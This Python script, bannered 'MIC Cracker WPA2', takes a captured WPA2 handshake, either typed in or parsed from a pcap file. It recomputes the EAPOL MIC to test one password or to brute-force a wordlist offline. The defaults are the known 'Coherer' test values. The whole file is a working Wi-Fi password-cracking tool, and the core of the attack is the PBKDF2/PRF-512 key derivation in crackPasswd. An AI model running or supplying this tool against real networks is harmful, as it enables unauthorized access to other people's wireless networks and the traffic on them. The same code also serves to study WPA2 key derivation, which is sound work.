import hmac,hashlib
import scapy
from scapy.all import *
from pbkdf2 import PBKDF2
import binascii

class WPA2Handshake:
    ssid = ''
    macAP = ''
    macCli = ''
    anonce = ''
    snonce = ''
    mic = ''
    passw = ''
    Eapol2frame = ''

def customPRF512(pmk,text,key_data):
    c = 0
    block = 64 
    result = bytes()
    while c<=((block*8+159)/160):
        hmacsha1 = hmac.new(pmk,text+chr(0x00).encode()+key_data+chr(c).encode(),hashlib.sha1)
        result = result + hmacsha1.digest()
        c += 1
    return  result[:block]



def testData():
    WPA2Handshake.ssid = input("Enter the ssid: ") or "Coherer"
    WPA2Handshake.macAP = input("Enter the mac AP: ") or "00:0C:41:82:B2:55"
    WPA2Handshake.macCli = input("Enter the mac STA : ") or "00:0D:93:82:36:3A"
    WPA2Handshake.anonce = input("Enter the Anonce : ") or "3e8e967dacd960324cac5b6aa721235bf57b949771c867989f49d04ed47c6933"
    WPA2Handshake.snonce = input("Enter the Snonce: ") or "cdf405ceb9d889ef3dec42609828fae546b7add7baecbb1a394eac5214b1d386"
    WPA2Handshake.mic = input("Enter the mic: ") or "a462a7029ad5ba30b6af0df391988e45"
    WPA2Handshake.Eapol2frame = input("Enter the EAPOL2 frame: ") or "0203007502010a00100000000000000000cdf405ceb9d889ef3dec42609828fae546b7add7baecbb1a394eac5214b1d3860000000000000000000000000000000000000000000000000000000000000000a462a7029ad5ba30b6af0df391988e45001630140100000fac020100000fac040100000fac020000"
    

def loadHandshakeFromPcap(scapycap):
    #main
    count = 0
    for packet in scapycap:
        if packet.haslayer("EAPOL"):
            rw = bytes(packet["Raw"]).hex()
            if count == 0:
                WPA2Handshake.anonce = rw[26:90]
                WPA2Handshake.macCli = packet.addr1
            elif count == 1:
                WPA2Handshake.snonce = rw[26:90]
                WPA2Handshake.macAP = packet.addr3
                WPA2Handshake.mic = rw[154:186]
                WPA2Handshake.Eapol2frame = raw(packet["EAPOL"]).hex()
            count += 1
    if count == 0:
        "No handshake found!"
        exit()


def viewdata():
    #view
    print("SSID: "+ WPA2Handshake.ssid)
    print("mac_ap :"+str(WPA2Handshake.macAP))
    print("mac_Cli :"+str(WPA2Handshake.macCli))
    print("anonce: "+WPA2Handshake.anonce)
    print("snonce: "+WPA2Handshake.snonce)
    print("Captured MIC: "+WPA2Handshake.mic)
    print("")


def banner():
    print("#######################")
    print("#  MIC Cracker WPA2   #")
    print("#######################")
    print("")

#main
def main():
    while True:
        banner()
        print("Select the load mode!")
        print("[0] - Manual Input")
        print("[1] - PCAP input")
        print("[9] - Exit")
        opt = int(input(" > Select an option: "))
        if opt == 9:
            exit()
        elif opt == 0:
            testData()
            passmode()
        elif opt == 1:
            WPA2Handshake.ssid = input("Enter the ssid: ") or 'Coherer'
            handshake = input("PCAP path > ") 
            scapycap = rdpcap(handshake)
            loadHandshakeFromPcap(scapycap)
            passmode()

def passmode():
    print("")
    while True:
        viewdata()
        print("[0] - Manual check password")
        print("[1] - Bruteforce password")
        print("[9] - Back")
        opt = int(input(" > Select an option: "))
        print("")
        if opt == 9:
            main()
        elif opt == 1:
            crackPasswd()
        elif opt == 0:
            WPA2Handshake.passw = input("input the password to check: > ") or "Induction"
            checkPasswd()

def crackPasswd():
    wordlist = input("Wordlist path >")
    file = open(wordlist,'r+')
    for l in file.readlines():
        PMK = PBKDF2(l, WPA2Handshake.ssid, 4096).read(32)
        macAPparsed = WPA2Handshake.macAP.replace(":","").lower()
        macAPparsed = binascii.a2b_hex(macAPparsed)
        macCliparsed = WPA2Handshake.macCli.replace(":","").lower()
        macCliparsed = binascii.a2b_hex(macCliparsed)
        anoncep = binascii.a2b_hex(WPA2Handshake.anonce)
        snoncep = binascii.a2b_hex(WPA2Handshake.snonce)
        key_data = min(macAPparsed,macCliparsed) + max(macAPparsed,macCliparsed)+ min(anoncep,snoncep)+ max(anoncep,snoncep)
        key_data = min(macAPparsed,macCliparsed) + max(macAPparsed,macCliparsed)+ min(anoncep,snoncep)+ max(anoncep,snoncep)
        txt = b"Pairwise key expansion"
        PTK = customPRF512(PMK,txt,key_data)
        KCK = PTK[0:16]
        eapol2data = WPA2Handshake.Eapol2frame[:162]+(32*"0")+WPA2Handshake.Eapol2frame[194:]
        calculated_mic = hmac.new(KCK, binascii.a2b_hex(eapol2data), hashlib.sha1).digest()[:16]
        if calculated_mic.hex() == WPA2Handshake.mic:
            print("####################")
            print("# Password Correct #")
            print("####################")
            print("PW: "+str(l))
            print("")
            
def checkPasswd():
    print("[+]Generating PMK via PBKDF2...")
    PMK = PBKDF2(WPA2Handshake.passw, WPA2Handshake.ssid, 4096).read(32)
    print("Pairwise Master Key (PMK): " + str(PMK.hex()))
    print("[+]Generating PTK...")
    print("[-] Generating key_data...")
    macAPparsed = WPA2Handshake.macAP.replace(":","").lower()
    macAPparsed = binascii.a2b_hex(macAPparsed)
    macCliparsed = WPA2Handshake.macCli.replace(":","").lower()
    macCliparsed = binascii.a2b_hex(macCliparsed)
    anoncep = binascii.a2b_hex(WPA2Handshake.anonce)
    snoncep = binascii.a2b_hex(WPA2Handshake.snonce)
    key_data = min(macAPparsed,macCliparsed) + max(macAPparsed,macCliparsed)+ min(anoncep,snoncep)+ max(anoncep,snoncep)
    txt = b"Pairwise key expansion"
    print("key data: "+binascii.b2a_hex(key_data).decode())
    print("[-] Running PRF512 algorithm...")
    PTK = customPRF512(PMK,txt,key_data)
    print("Pairwise Temporal Key (PTK): " + str(PTK.hex()))
    KCK = PTK[0:16]
    print("[+] Calculating MIC")
    print("[-] Zeroing MIC in EAPOL2 frame")
    eapol2data = WPA2Handshake.Eapol2frame[:162]+(32*"0")+WPA2Handshake.Eapol2frame[194:]
    print(WPA2Handshake.Eapol2frame)
    print("[-] MIC calculatingg...")
    calculated_mic = hmac.new(KCK, binascii.a2b_hex(eapol2data), hashlib.sha1).digest()[:16]
    print("Calculated MIC: "+str(calculated_mic.hex()))
    print("Grabbed MIC: "+str(WPA2Handshake.mic))
    print("")
    if calculated_mic.hex() == WPA2Handshake.mic:
        print("####################")
        print("# Password Correct #")
        print("####################")
        print("")
        
    

main()
